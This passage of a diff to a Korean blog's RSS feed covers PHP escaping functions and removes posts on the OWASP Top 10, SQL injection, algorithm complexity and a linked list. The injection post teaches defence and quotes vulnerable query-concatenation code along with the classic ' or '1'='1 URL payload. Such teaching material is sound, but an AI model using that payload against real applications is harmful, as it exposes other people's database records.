no_check($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;1&quot;</span> :</span><br><span class="line">        $data = sqli_check_1($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;2&quot;</span> :</span><br><span class="line">        $data = sqli_check_2($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> :</span><br><span class="line">        $data = no_check($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>sqli_check_1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_1</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addslashes 함수로 특정 특수 문자 앞에 <code>\</code>을 넣어서 이스케이프하였다.</p><figure class="highlight php"><figcaption><span>sqli_check_2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_2</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mysql_real_escape_string 함수를 이용하여 SQL에 사용되는 특수 문자 앞에 <code>\</code>을 넣어서 이스케이프 처리하였다.</p>]]></content:encoded>
       
       
       <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
@@ -66,9 +216,9 @@
     
     <item>
       <title>알고리즘 정리 - 버블, 선택, 삽입 정렬</title>
-      <link>https://lrtk-coder.github.io/2021/02/21/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%A0%95%EB%A0%AC-%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EA%B0%9C%EC%9A%94/</link>
-      <guid>https://lrtk-coder.github.io/2021/02/21/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%A0%95%EB%A0%AC-%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EA%B0%9C%EC%9A%94/</guid>
-      <pubDate>Sun, 21 Feb 2021 03:44:00 GMT</pubDate>
+      <link>https://lrtk-coder.github.io/2021/02/20/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%A0%95%EB%A0%AC-%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EA%B0%9C%EC%9A%94/</link>
+      <guid>https://lrtk-coder.github.io/2021/02/20/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%A0%95%EB%A0%AC-%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EA%B0%9C%EC%9A%94/</guid>
+      <pubDate>Sat, 20 Feb 2021 18:44:00 GMT</pubDate>
       
         
         
@@ -84,7 +234,7 @@
       
       <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
       
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EC%9D%B4%EB%A1%A0/">이론</category>
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/Basic/">Basic</category>
       
       
       <category domain="https://lrtk-coder.github.io/tags/Bubble-Sort/">Bubble Sort</category>
@@ -94,7 +244,7 @@
       <category domain="https://lrtk-coder.github.io/tags/Insertion-Sort/">Insertion Sort</category>
       
       
-      <comments>https://lrtk-coder.github.io/2021/02/21/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%A0%95%EB%A0%AC-%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EA%B0%9C%EC%9A%94/#disqus_thread</comments>
+      <comments>https://lrtk-coder.github.io/2021/02/20/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%A0%95%EB%A0%AC-%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EA%B0%9C%EC%9A%94/#disqus_thread</comments>
       
     </item>
     
@@ -452,154 +602,6 @@
       
       
       <comments>https://lrtk-coder.github.io/2021/02/16/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-4299%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>OWASP TOP 10 개요</title>
-      <link>https://lrtk-coder.github.io/2021/02/16/2020-OWASP-TOP-10/</link>
-      <guid>https://lrtk-coder.github.io/2021/02/16/2020-OWASP-TOP-10/</guid>
-      <pubDate>Tue, 16 Feb 2021 09:33:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;OWASP-TOP-10이란&quot;&gt;&lt;a href=&quot;#OWASP-TOP-10이란&quot; class=&quot;headerlink&quot; title=&quot;OWASP TOP 10이란?&quot;&gt;&lt;/a&gt;OWASP TOP 10이란?&lt;/h1&gt;&lt;p&gt;오픈 웹 어플리케이션 보안 프로젝트 </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="OWASP-TOP-10이란"><a href="#OWASP-TOP-10이란" class="headerlink" title="OWASP TOP 10이란?"></a>OWASP TOP 10이란?</h1><p>오픈 웹 어플리케이션 보안 프로젝트 커뮤니티인 OWASP(The Open Web Application Security Project)에서 제작됨.</p><p>웹 애플리케이션 취약점 중에서 빈도가 많이 발생하고, 보안상 영향을 크게 줄 수 있는 것들 10가지를 선정하여 2004년, 2007년, 2010년, 2013년, 2017년을 기준으로 발표되었고, 문서가 공개함.</p><blockquote><p>2020년도 문서는 아직 발표되지 않았음. <a href="https://github.com/OWASP/Top10/tree/master/2020">OWASP 공식 깃허브</a>에서 확인해보면 2020년도 문서는 아직 제작 중인 상황임.</p></blockquote><h1 id="OWASP-TOP-10-2013년-2017년-변경-사항"><a href="#OWASP-TOP-10-2013년-2017년-변경-사항" class="headerlink" title="OWASP TOP 10 2013년 - 2017년 변경 사항"></a>OWASP TOP 10 2013년 - 2017년 변경 사항</h1><p><img src="/images/pasted-175.png" alt="출처 : OWASP TOP 10 공식 한국번역 PDF"></p><p><img src="/images/pasted-179.png"></p><ul><li>node.js와 Spring Boot로 작성된 마이크로 서비스는 <strong>SPA(단일 애플리케이션)로 대체</strong>되고 있음.<br> 주로 보안 문제 였던 마이크로 서비스, 컨테이너 등은 SPA와 모바일 어플리케이션에서 사용되는 API or RESTful 웹 서비스 뒤에 있음. 더 이상 신뢰할 수 있는 호출자와 같은 코드에 의한 아키텍처 가정은 유효하지 않음.</li><li>Angular 및 React와 같은 자바스크립트 프레임워크로 작성된 SRA은 모듈식 기능이 많은 프론트엔드(서버의 기능을 프론트엔드에서 어느정도 가능)를 제작할 수 있음. 이에 클라이언트 측의 기능은 보안 문제를 야기할 수 있음.</li></ul><h1 id="OWASP-TOP-2017"><a href="#OWASP-TOP-2017" class="headerlink" title="OWASP TOP 2017"></a>OWASP TOP 2017</h1><h2 id="A1-주입-Injection"><a href="#A1-주입-Injection" class="headerlink" title="A1 - 주입 (Injection)"></a>A1 - 주입 (Injection)</h2><p>SQL, OS, XEE, LDAP 인젝션 취약점은 <strong>신뢰할 수 없는 데이터가 명령어나 쿼리문의 일부분으로써, 인터프리터로 보내질 때 발생</strong>함. 공격자의 악의적인 데이터는 예상치 못한 명령을 실행하거나 올바른 권한 없이 데이터에 접근하도록 인터프리터를 속일 수 있음.</p><h2 id="A2-취약한-인증-Broken-Authentication"><a href="#A2-취약한-인증-Broken-Authentication" class="headerlink" title="A2 - 취약한 인증 (Broken Authentication)"></a>A2 - 취약한 인증 (Broken Authentication)</h2><p><strong>인증 및 세션 관리와 관련된 애플리케이션 기능이 종종 잘못 구현</strong>되어 공격자가 암호, 키, 세션 토큰을 위험에 노출 시킬 수 있거나 일시적인 또는 영구적으로 다른 사용자의 권한 획득을 위해 구현 상 결함을 악용하도록 허용함.</p><h2 id="A3-민감한-데이터-노출-Sensitive-Data-Exposure"><a href="#A3-민감한-데이터-노출-Sensitive-Data-Exposure" class="headerlink" title="A3 - 민감한 데이터 노출 (Sensitive Data Exposure)"></a>A3 - 민감한 데이터 노출 (Sensitive Data Exposure)</h2><p><strong>다수의 웹 애플리케이션과 API는 중요한 정보(금융 정보, 건강 정보, 개인 식별 정보 등)를 제대로 보호하지 못함.</strong><br><br>공격자는 범죄(신용카드 사기, 신분 도용 등)를 수행하기 위해 보호가 취약한 데이터를 훔치거나 수정할 수 있음.<br><br>중요한 데이터는 저장 또는 전송 할 때 암호화 같은 추가적인 보호 조치가 없으면 탈취 당할 수 있으며, 브라우저에서 주고 받을 때 각별한 주의가 필요함.</p><h2 id="A4-XML-외부-개체-XXE-XML-External-Entities"><a href="#A4-XML-외부-개체-XXE-XML-External-Entities" class="headerlink" title="A4 - XML 외부 개체 (XXE : XML External Entities)"></a>A4 - XML 외부 개체 (XXE : XML External Entities)</h2><p><strong>오래되거나 잘못 구성된 XML 프로세서가 XML 문서 내에서 외부 개체 참조를 처리함.</strong><br><br>이러한 문제로 외부 개체로 파일 URI 핸들링, 내부 파일 공유, 내부 포트 스캔, 원격 코드 실행과 서비스 거부 공격에 사용될 수 있음.</p><h2 id="A5-취약한-접근-통제-Broken-Access-Control"><a href="#A5-취약한-접근-통제-Broken-Access-Control" class="headerlink" title="A5 - 취약한 접근 통제 (Broken Access Control)"></a>A5 - 취약한 접근 통제 (Broken Access Control)</h2><p><strong>인증된 사용자가 수행할 수 있는 작업에 대한 제한이 제대로 적용되지 않음.</strong><br><br>공격자는 이러한 결함을 악용하여 다른 계정 접근, 중요한 파일 열람, 다른 계정의 데이터 수정, 접근 권한 변경 등의 권한이 없는 기능과 데이터에 접근 할 수 있음.</p><h2 id="A6-잘못된-보안-구성-Security-Misconfiguration"><a href="#A6-잘못된-보안-구성-Security-Misconfiguration" class="headerlink" title="A6 - 잘못된 보안 구성 (Security Misconfiguration)"></a>A6 - 잘못된 보안 구성 (Security Misconfiguration)</h2><p>가장 흔하게 보이는 사건임.<br><br><strong>취약한 기본 설정, 임시 설정, 개방된 클라우드 스토리지, 잘못 구성된 HTTP 헤더 및 민감한 정보가 포함된 에러 메시지로 인한 결과임.</strong><br></p><h2 id="A7-크로스-사이트-스크립팅-XSS-Cross-Site-Scripting"><a href="#A7-크로스-사이트-스크립팅-XSS-Cross-Site-Scripting" class="headerlink" title="A7 - 크로스 사이트 스크립팅 (XSS : Cross-Site Scripting)"></a>A7 - 크로스 사이트 스크립팅 (XSS : Cross-Site Scripting)</h2><p>애플리케이션이 <strong>올바른 유효성 검사 또는 필터링 처리 없이 새로운 페이지에 신뢰할 수 없는 데이터를 포함하거나, 자바스크립트와 HTML을 생성하는 브라우저 API를 활용한 사용자 제공 데이터로 기존 페이지를 업데이트할 때 발생함.</strong><br><br>이러한 공격은 피해자의 브라우저에서 공격자에 의해 스크립트를 실행시켜 사용자 세션을 탈취할 수 있게 만들고, 사이트 변조나 악성 사이트 리다이렉션을 할 수 있도록 허용함.</p><h2 id="A8-안전하지-않은-역직렬화-Insecure-Deserialization"><a href="#A8-안전하지-않은-역직렬화-Insecure-Deserialization" class="headerlink" title="A8 - 안전하지 않은 역직렬화 (Insecure Deserialization)"></a>A8 - 안전하지 않은 역직렬화 (Insecure Deserialization)</h2><p>이 취약점은 종종 <strong>원격 코드 실행으로 이어지거나 권한 상승, Injection(주입), Replay(재전송) 공격을 포함한 다양한 공격 수행에 사용됨.</strong></p><h2 id="A9-알려진-취약점이-있는-구성요소-사용-Using-Components-with-Known-Vulnerabilities"><a href="#A9-알려진-취약점이-있는-구성요소-사용-Using-Components-with-Known-Vulnerabilities" class="headerlink" title="A9 - 알려진 취약점이 있는 구성요소 사용 (Using Components with Known Vulnerabilities)"></a>A9 - 알려진 취약점이 있는 구성요소 사용 (Using Components with Known Vulnerabilities)</h2><p>라이브러리, 프레임워크 및 다른 소프트웨어 모듈 같은 컴포넌트는 애플리케이션과 같은 권한으로 실행됨.<br><br>만약 취약한 컴포넌트가 악용된 경우, 이는 심각한 데이터 손실을 일으키거나 서버가 장악이 될 수 있음.<br><br><strong>알려진 취약점이 있는 컴포넌트를 사용한 애플리케이션과 API는 애플리케이션 방어를 약화시키거나 다양한 공격과 영향을 주게 됨.</strong></p><h2 id="A10-불충분한-로깅-amp-모니터링-Insufficient-Logging-amp-Monitoring"><a href="#A10-불충분한-로깅-amp-모니터링-Insufficient-Logging-amp-Monitoring" class="headerlink" title="A10 - 불충분한 로깅 &amp; 모니터링 (Insufficient Logging &amp; Monitoring)"></a>A10 - 불충분한 로깅 &amp; 모니터링 (Insufficient Logging &amp; Monitoring)</h2><p><strong>공격자의 시스템을 공격 지속성을 유지 시키며, 더 많은 시스템을 공격할 수 있도록 만들게 됨. 또한 데이터 변조, 추출 또는 파괴를 할 수 도 있음.</strong><br><br>대부분의 침해 사례에서 침해를 탐지하는 시간이 200일이 넘게 걸리는 것을 보여주고, 이는 일반적으로 내부 프로세스와 모니터링보다 외부 기관이 탐지함.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/OWASP-TOP-10/">OWASP TOP 10</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/OWASP/">OWASP</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/02/16/2020-OWASP-TOP-10/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>OWASP TOP 10 A1 - Injection</title>
-      <link>https://lrtk-coder.github.io/2021/02/16/OWASP-TOP-10-A1-Injection/</link>
-      <guid>https://lrtk-coder.github.io/2021/02/16/OWASP-TOP-10-A1-Injection/</guid>
-      <pubDate>Tue, 16 Feb 2021 02:19:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;Injection&quot;&gt;&lt;a href=&quot;#Injection&quot; class=&quot;headerlink&quot; title=&quot;Injection&quot;&gt;&lt;/a&gt;Injection&lt;/h1&gt;&lt;p&gt;SQL, OS, XEE, LDAP 인젝션 취약점은 신뢰할 수 없는 데이터가 </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h1><p>SQL, OS, XEE, LDAP 인젝션 취약점은 신뢰할 수 없는 데이터가 명령어나 쿼리문의 일부분으로써, 인터프리터로 보내질 때 발생함. 공격자의 악의적인 데이터는 예상치 못한 명령을 실행하거나 올바른 권한 없이 데이터에 접근하도록 인터프리터를 속일 수 있음.</p><h2 id="내가-이해한-Injection"><a href="#내가-이해한-Injection" class="headerlink" title="내가 이해한 Injection"></a>내가 이해한 Injection</h2><p>한 사람(서버)이 있는데 백신 주사를 맞아야함.</p><p>간호사(사용자)가 백신이 들어있는 주사기를 혈관(인터프리터)에 삽입하여 백신(DB Query, OS 명령어 등 중 하나)을 주입을 함.</p><p>다음날 2차 백신을 맞기 위해 다시 한번 주사를 맞았는데 나쁜 간호사(공격자)가 백신이 아닌 바이러스(SQL Injection, OS Injection 등 중 하나)를 주사를 혈관(인터프리터)에 삽입하여 주입하였음.</p><h2 id="공격-요인"><a href="#공격-요인" class="headerlink" title="공격 요인"></a>공격 요인</h2><p>환경 변수, 파라미터, 내/외부 웹 서비스, 모든 유형의 사용자 등 거의 모든 데이터의 소스는 인젝션 공격 요인이 될 수 있음.</p><p>공격자가 <strong>악의적인 데이터를 인터프리터에 보낼 때 인젝션 결함이 발생함.</strong></p><h2 id="보안-취약점"><a href="#보안-취약점" class="headerlink" title="보안 취약점"></a>보안 취약점</h2><p>인젝션 취약점은 매우 일반적이며, 특히 과거에 사용된 코드에서 많이 나타남.</p><p>SQL, LDAP, XPath, NoSQL, ORM 쿼리 / OS 명령어 / XML 파서 / SMTP 헤더 / 표현식 언어 등에서 자주 발견됨.</p><p>인젝션 취약점은 코드를 검증하는 과정에서 쉽게 발견할 수 있음. 공격자는 스캐너와 퍼저로 인젝션 결함을 찾는데 도움을 얻음.</p><h2 id="영향"><a href="#영향" class="headerlink" title="영향"></a>영향</h2><p>인젝션은 데이터 손실, 파괴, 권한 없는 사용자에게 정보 노출, 승인되지 않은 당사자에게 정보 무단 공개, 책임 부재, 서비스 거부 결과를 초래 할 수 있음.</p><p>떄때로 인젝션으로 호스트를 완전하게 탈취할 수도 있음. 비즈니스는 애플리케이션과 데이터의 필요성에 따라 달라짐.</p><h2 id="취약점-확인법"><a href="#취약점-확인법" class="headerlink" title="취약점 확인법"></a>취약점 확인법</h2><p><strong>취약한 공격 목록</strong></p><ul><li>사용자 제공 데이터가 유효하지 않거나, 필터링 되어지지 않거나, 애플리케이션에 의해 정제되지 않음.</li><li>상황 인식 기반 필터링 없이 동적 쿼리나 매개 변수화 되지 않은 호출이 인터프리터에서 직접 사용됨.</li><li>악의적인 데이터가 ORM(객체 관계형 매핑) 검색 매개 변수 내에서 사용되어 추가로 민감한 정보를 추출함.</li><li>악의적인 데이터가 직접적으로 동적 쿼리 안에 포함된 구조적 데이터와 악의적 데이터를 포함한 명령어, 일반 명령어, SQL, 저장 프로시저에 사용되거나 연결됨.</li></ul><p>보다 일반적으로 SQL, NoSQL, OS 명령어, ORM, LDAP,EL(Expression Languages), OGNL(Object Graph Navigation Library) 인젝션이 있음.</p><p>애플리케이션이 인젝션에 취약한지 판별하기 위해선 소스코드를 리뷰하는 것과 더불어 모든 파라미터, 헤더, URL, 쿠키, JSON, SOAP,, XML 데이터 입력에 대한 철저한 자동화 테스트가 가장 좋은 방법임.</p><p>기관은 정적 애프리케이션 보안 테스트(SAST)와 동적 애플리케이션 테스트(DAST) 툴을 CI/CD 파이프라인에 포함시켜 새로운 인젝션 결합을 운영 시스템 배포 전에 발견할 수 있음.</p><h2 id="공격-시나리오-예제"><a href="#공격-시나리오-예제" class="headerlink" title="공격 시나리오 예제"></a>공격 시나리오 예제</h2><h3 id="애플리케이션은-취약한-SQL-호출-구조에서-신뢰되지-않은-데이터를-사용함"><a href="#애플리케이션은-취약한-SQL-호출-구조에서-신뢰되지-않은-데이터를-사용함" class="headerlink" title="애플리케이션은 취약한 SQL 호출 구조에서 신뢰되지 않은 데이터를 사용함."></a>애플리케이션은 취약한 SQL 호출 구조에서 신뢰되지 않은 데이터를 사용함.</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> query = <span class="string">&quot;SELECT * FROM accounts WHERE custID=&#x27;&quot;</span> + request.getParameter(<span class="string">&quot;ID&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="프레임워크에-대한-애플리케이션의-맹목적인-신뢰는-여전히-취약한-쿼리를-초래함"><a href="#프레임워크에-대한-애플리케이션의-맹목적인-신뢰는-여전히-취약한-쿼리를-초래함" class="headerlink" title="프레임워크에 대한 애플리케이션의 맹목적인 신뢰는 여전히 취약한 쿼리를 초래함."></a>프레임워크에 대한 애플리케이션의 맹목적인 신뢰는 여전히 취약한 쿼리를 초래함.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Query HQLQuery &#x3D; session.createQuery(&quot;FROM accounts WHERE custID&#x3D;&#39;&quot; + request.getParameter(&quot;id&quot;) + &quot;&#39;&quot;);</span><br></pre></td></tr></table></figure><p>시나리오 1, 시나리오 2 사례로 보아, 공격자는 브라우저에서 전송할 ‘id’ 파라미터 값을 <code>&#39; or &#39;1&#39;=&#39;1</code>수정함.<br> <code>htttp://example.com/app/accountView?id=&#39; or &#39;1&#39;=&#39;1</code></p><p>이렇게 하면, 두 쿼리의 의미가 변경되어 accounts 테이블의 모든 레코드가 반환됨. 더 위험한 공격은 저장 프로시저의 데이터를 수정하거나 파괴함.</p><h2 id="보안-대책"><a href="#보안-대책" class="headerlink" title="보안 대책"></a>보안 대책</h2><p>인젝션을 예방하기 위해선 데이터를 지속적으로 명령어와 쿼리로부터 분리시켜야함.</p><ul><li>기본 옵션은 인터프리터 사용을 피하거나 매개변수화된 인터페이스를 제공하는 안전한 API를 사용하거나 ORMs 툴을 사용하도록 마이그레이션하는 것</li><li>서버 측 “화이트리스트”나 적극적인 입력값 유효성 검증을 해야함. 하지만 많은 애플리케이션이 모바일 애플리케이션을 위한 텍스트 영역이나 API와 같은 특수 문자를 필요로 하기에 완벽한 방어책은 아님.</li><li>남은 동적 쿼리들을 위하여 특정 필터링 구문을 사용하여 인터프리터에 대한 특수 문자를 필터링 처리해야함.<blockquote><p>주의 : 테이블, 컬럼 이름 등과 같은 SQL 구조는 필터링 처리를 할 수가 없기 때문에 사용자가 제공한 구조 이름은 안전하지 않음. 이는 보고서 작성 소프트웨어의 일반적인 문제임.</p></blockquote></li><li>LIMIT과 다른 SQL 컨트롤 쿼리를 사용하여 SQL 인젝션으로 인한 대량 노출을 예방해야함.</li></ul>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/OWASP-TOP-10/">OWASP TOP 10</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/OWASP/">OWASP</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/02/16/OWASP-TOP-10-A1-Injection/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>알고리즘 복잡도</title>
-      <link>https://lrtk-coder.github.io/2021/02/15/%EC%8B%9C%EA%B0%84-%EB%B3%B5%EC%9E%A1%EB%8F%84/</link>
-      <guid>https://lrtk-coder.github.io/2021/02/15/%EC%8B%9C%EA%B0%84-%EB%B3%B5%EC%9E%A1%EB%8F%84/</guid>
-      <pubDate>Mon, 15 Feb 2021 19:25:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;알고리즘-복잡도-계산이-필요한-이유&quot;&gt;&lt;a href=&quot;#알고리즘-복잡도-계산이-필요한-이유&quot; class=&quot;headerlink&quot; title=&quot;알고리즘 복잡도 계산이 필요한 이유&quot;&gt;&lt;/a&gt;알고리즘 복잡도 계산이 필요한 이유&lt;/h1&gt;&lt;p&gt;하나</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="알고리즘-복잡도-계산이-필요한-이유"><a href="#알고리즘-복잡도-계산이-필요한-이유" class="headerlink" title="알고리즘 복잡도 계산이 필요한 이유"></a>알고리즘 복잡도 계산이 필요한 이유</h1><p>하나의 문제를 푸는 알고리즘은 다양할 수 있음.<br><br>이 중 어느 알고리즘이 더 뛰어난지 계산이 필요함.</p><h1 id="알고리즘-복잡도-계산-항목"><a href="#알고리즘-복잡도-계산-항목" class="headerlink" title="알고리즘 복잡도 계산 항목"></a>알고리즘 복잡도 계산 항목</h1><ol><li>시간 복잡도 : 알고리즘 실행 속도</li><li>공간 복잡도 : 알고리즘이 사용하는 메모리 사이즈</li></ol><blockquote><p>요즘, 하드웨어가 발전을 하면서 공간 복잡도는 그리 중요하지 않게 된다.</p></blockquote><h2 id="시간-복잡도의-주요-요소"><a href="#시간-복잡도의-주요-요소" class="headerlink" title="시간 복잡도의 주요 요소"></a>시간 복잡도의 주요 요소</h2><p>반복문이 크게 영향을 끼침.</p><h1 id="알고리즘-성능-표기법"><a href="#알고리즘-성능-표기법" class="headerlink" title="알고리즘 성능 표기법"></a>알고리즘 성능 표기법</h1><h2 id="빅-오-표기법-O-n"><a href="#빅-오-표기법-O-n" class="headerlink" title="빅-오 표기법 : O(n)"></a>빅-오 표기법 : O(n)</h2><ul><li>알고리즘 최악의 실행 시간을 표기</li><li>가장 많이/일반적으로 사용함.</li><li>아무리 최악의 상황이라도, 빅오의 만큼의 성능은 보장한다는 의미</li></ul><h2 id="오메가-표기법-Ω-n"><a href="#오메가-표기법-Ω-n" class="headerlink" title="오메가 표기법 : Ω(n)"></a>오메가 표기법 : Ω(n)</h2><ul><li>오메가 표기법은 알고리즘 최상의 실행 시간을 표기</li></ul><h2 id="세타-표기법-Θ-n"><a href="#세타-표기법-Θ-n" class="headerlink" title="세타 표기법 : Θ(n)"></a>세타 표기법 : Θ(n)</h2><ul><li>세타 표기법은 알고리즘 평균 실행 시간을 표기</li></ul><blockquote><p>시간 복잡도 계산은 반복문이 핵심 요소임을 인지하고, 계산 표기는 최상, 평균, 최악 중 최악의 시간인 빅-오 표기법을 중심으로 익히면 됨.</p></blockquote><h1 id="빅-오-표기법"><a href="#빅-오-표기법" class="headerlink" title="빅-오 표기법"></a>빅-오 표기법</h1><ul><li>입력 n에 따라 결정되는 시간 복잡도 함수</li><li>O(1), O(log n), O(n), O(n log n), O(n^2), O(2^n), O(n!) 등으로 표기함<br><code>O(1) &lt; O(log n) &lt; O(n) &lt; O(n log n) &lt; O(n^2) &lt; O(2^n) &lt; O(n!)</code></li></ul><blockquote><p>참고 : log n 의 베이스는 2 - log<sub>2</sub> n</p></blockquote><ul><li>단순하게 입력 n에 따라, 몇 번 실행되는지를 계산하면 됨.</li><li>표현식에 가장 큰 영향을 미치는 n의 단위로 표기함.<br><br>ex)<br><br>3n+10, 3n+10 : O(n)<br><br>3n<sup>2</sup>, n<sup>2</sup>+2 : O(n<sup>2</sup>)</li></ul><figure class="highlight python"><figcaption><span>O(1)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> n &gt; <span class="number">10</span>:</span><br><span class="line">print(n)</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>O(n)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>3n<sup>2</sup> : O(n<sup>2</sup>)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    print(k)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-173.png"></p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EC%9D%B4%EB%A1%A0/">이론</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EB%B3%B5%EC%9E%A1%EB%8F%84/">알고리즘 복잡도</category>
-      
-      <category domain="https://lrtk-coder.github.io/tags/Big-O/">Big-O</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/02/15/%EC%8B%9C%EA%B0%84-%EB%B3%B5%EC%9E%A1%EB%8F%84/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Data Structure - Double Linked List 구현</title>
-      <link>https://lrtk-coder.github.io/2021/02/15/Data-Structure-Double-Linked-List-%EA%B5%AC%ED%98%84/</link>
-      <guid>https://lrtk-coder.github.io/2021/02/15/Data-Structure-Double-Linked-List-%EA%B5%AC%ED%98%84/</guid>
-      <pubDate>Mon, 15 Feb 2021 19:07:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;figure class=&quot;highlight python&quot;&gt;&lt;figcaption&gt;&lt;span&gt;Code&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<figure class="highlight python"><figcaption><span>Code</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 